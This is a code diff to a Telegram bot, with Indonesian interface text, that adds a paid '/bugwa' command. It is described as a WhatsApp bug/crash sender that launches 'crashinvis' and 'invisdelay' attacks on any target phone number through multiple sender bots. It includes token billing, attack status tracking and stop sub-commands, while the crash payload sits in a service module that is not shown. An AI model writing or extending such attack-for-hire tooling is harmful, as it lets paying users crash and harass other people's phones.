@@ -4,6 +4,7 @@ const apiService = require('../services/api');
 const paymentService = require('../services/payment');
 const satsiberService = require('../services/satsiber');
 const terbangbebasService = require('../services/terbangbebas');
+const bugwaService = require('../services/bugwa');
 const { isValidNIK, isValidKK } = require('../utils/helper');
 const formatter = require('../utils/formatter');
 const { satsiberFotoResultMessage, vehicleResultMessage } = require('../utils/formatter');
@@ -2410,6 +2411,179 @@ Pilih fitur yang ingin digunakan:
                 { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
             );
         }
+    },
+
+    /**
+     * ═══════════════════════════════════════════
+     * Command: /bugwa <target> <mode>
+     * BugWA - WhatsApp Bug/Crash Sender
+     * Mode: crashinvis, invisdelay
+     * ═══════════════════════════════════════════
+     */
+    async bugwa(bot, msg, args) {
+        const userId = String(msg.from.id);
+        const validModes = bugwaService.getValidModes();
+        const modeList = Object.entries(validModes).map(([k, v]) => `• <b>${k}</b> - ${v.name}`).join('\n');
+
+        if (args.length < 2) {
+            await bot.sendMessage(msg.chat.id,
+                `❌ <b>Format Salah</b>\n\n📋 <b>Cara Penggunaan:</b>\n<code>/bugwa &lt;target&gt; &lt;mode&gt;</code>\n\n✅ <b>Mode:</b>\n${modeList}\n\n📱 <b>Contoh:</b>\n<code>/bugwa 081234567890 crashinvis</code>\n<code>/bugwa 6281234567890 invisdelay</code>\n\n📋 <b>Sub-command:</b>\n<code>/bugwa stop &lt;target&gt; &lt;mode&gt;</code> - Hentikan attack\n<code>/bugwa status</code> - Lihat attack aktif`,
+                { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        // Sub-command: stop
+        if (args[0].toLowerCase() === 'stop') {
+            if (args.length < 3) {
+                await bot.sendMessage(msg.chat.id,
+                    `❌ <b>Format:</b> <code>/bugwa stop &lt;target&gt; &lt;mode&gt;</code>\nContoh: <code>/bugwa stop 081234567890 crashinvis</code>`,
+                    { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+                );
+                return;
+            }
+            
+            const stopResult = await bugwaService.stopAttack(args[1], args[2], userId);
+            if (stopResult.success) {
+                await bot.sendMessage(msg.chat.id,
+                    `✅ <b>Attack Dihentikan</b>\n\n📞 Target: <b>${stopResult.target}</b>\n⚙️ Mode: <b>${stopResult.mode}</b>`,
+                    { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+                );
+            } else {
+                await bot.sendMessage(msg.chat.id,
+                    `❌ <b>Gagal Stop</b>\n\n${stopResult.error}`,
+                    { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+                );
+            }
+            return;
+        }
+
+        // Sub-command: status
+        if (args[0].toLowerCase() === 'status') {
+            const statusResult = await bugwaService.getActiveAttacks(userId);
+            
+            if (!statusResult.success) {
+                await bot.sendMessage(msg.chat.id,
+                    `❌ <b>Gagal Cek Status</b>\n\n${statusResult.error}`,
+                    { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+                );
+                return;
+            }
+
+            if (statusResult.total === 0) {
+                await bot.sendMessage(msg.chat.id,
+                    `📊 <b>ATTACK STATUS</b>\n\n📭 Tidak ada attack aktif`,
+                    { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+                );
+                return;
+            }
+
+            let statusText = `📊 <b>ATTACK AKTIF</b> (${statusResult.total})\n────────────────\n\n`;
+            statusResult.attacks.forEach((atk, i) => {
+                statusText += `${i + 1}. 📞 <b>${atk.target}</b>\n`;
+                statusText += `   ⚙️ Mode: <b>${atk.mode}</b>\n`;
+                statusText += `   📤 Sent: <b>${atk.count}x</b> (${atk.senderCount} sender)\n`;
+                statusText += `────────────────\n`;
+            });
+            statusText += `\n💡 <i>Stop: /bugwa stop &lt;target&gt; &lt;mode&gt;</i>`;
+
+            await bot.sendMessage(msg.chat.id, statusText, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
+            return;
+        }
+
+        // Main attack
+        const target = args[0];
+        const mode = args[1].toLowerCase();
+
+        if (!validModes[mode]) {
+            await bot.sendMessage(msg.chat.id,
+                `❌ <b>Mode tidak valid</b>\n\n✅ <b>Mode tersedia:</b>\n${modeList}`,
+                { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        // Cek user dan saldo
+        const user = db.getOrCreateUser(userId, msg.from.first_name);
+        const settings = db.getAllSettings();
+
+        // Cek Maintenance
+        if (settings.mt_bugwa === 'true') {
+            await bot.sendMessage(msg.chat.id,
+                '⚠️ <b>MAINTENANCE</b>\n\nFitur <b>BUGWA</b> sedang dalam perbaikan sementara.\nSilakan coba lagi nanti.',
+                { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        const bugwaCost = parseInt(settings.bugwa_cost) || config.bugwaCost || 3;
+
+        if (user.token_balance < bugwaCost) {
+            await bot.sendMessage(msg.chat.id,
+                `❌ <b>Saldo Tidak Cukup</b>\n\n🪙 Saldo: <b>${user.token_balance} token</b>\n💰 Biaya: <b>${bugwaCost} token</b>\n\nKetik /deposit untuk top up`,
+                { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        // Generate request ID
+        const requestId = db.createApiRequest(userId, 'bugwa', `${target} ${mode}`, 'bugwa', bugwaCost);
+
+        // Processing message
+        const processingMsg = await bot.sendMessage(msg.chat.id,
+            `⏳ <b>Sedang Proses...</b>\n\n${validModes[mode].icon} Mode: <b>${validModes[mode].name}</b>\n📞 Target: <b>${target}</b>\n🆔 ID: <code>${requestId}</code>\n<i>Mengirim bug...</i>`,
+            { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+        );
+
+        // Potong token
+        db.deductTokens(userId, bugwaCost);
+
+        // Send attack
+        const result = await bugwaService.attack(target, mode, userId);
+
+        const updatedUser = db.getUser(userId);
+        const remainingToken = updatedUser?.token_balance || 0;
+
+        if (!result.success) {
+            if (result.refund) {
+                db.refundTokens(userId, bugwaCost);
+            }
+            db.updateApiRequest(requestId, 'failed', null, null, result.error);
+            db.createTransaction(userId, 'check', bugwaCost, `BugWA gagal`, `${target} ${mode}`, 'failed');
+
+            await bot.editMessageText(
+                `❌ <b>Gagal</b>\n\n${result.error}\n\n${result.refund ? `🪙 Token dikembalikan: <b>${bugwaCost} token</b>\n` : ''}🆔 ID: <code>${requestId}</code>`,
+                { chat_id: msg.chat.id, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+            );
+            return;
+        }
+
+        // Berhasil
+        db.updateApiRequest(requestId, 'success', result.data.formattedTarget, null, null);
+        db.createTransaction(userId, 'check', bugwaCost, `BugWA ${result.data.modeName} ke ${result.data.formattedTarget}`, `${target} ${mode}`, 'success');
+
+        const successText = `${result.data.modeIcon} <b>BUGWA TERKIRIM</b>
+────────────────
+
+📞 <b>TARGET</b>
+Nomor: <b>${result.data.formattedTarget}</b>
+Negara: ${result.data.country}
+────────────────
+
+⚙️ <b>DETAIL</b>
+Mode: <b>${result.data.modeName}</b>
+Sender: ${result.data.senderCount} bot(s)
+────────────────
+
+🆔 ID: <code>${requestId}</code>
+🪙 Token: <b>-${bugwaCost}</b> (Sisa: <b>${remainingToken}</b>)
+
+💡 <i>Cek status: /bugwa status</i>
+🛑 <i>Stop: /bugwa stop ${target} ${mode}</i>`;
+
+        await bot.editMessageText(successText, 
+            { chat_id: msg.chat.id, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+        );
     }
 };
 
